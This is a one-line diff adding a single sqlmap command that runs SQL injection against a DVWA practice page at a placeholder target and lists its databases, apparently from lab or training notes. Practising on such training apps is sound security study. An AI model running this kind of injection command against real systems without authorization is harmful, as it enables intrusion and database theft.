@@ -1,0 +1,1 @@
+sqlmap -u http://<target>/dvwa/vulnerabilities/sqli/?id=1 --dbs
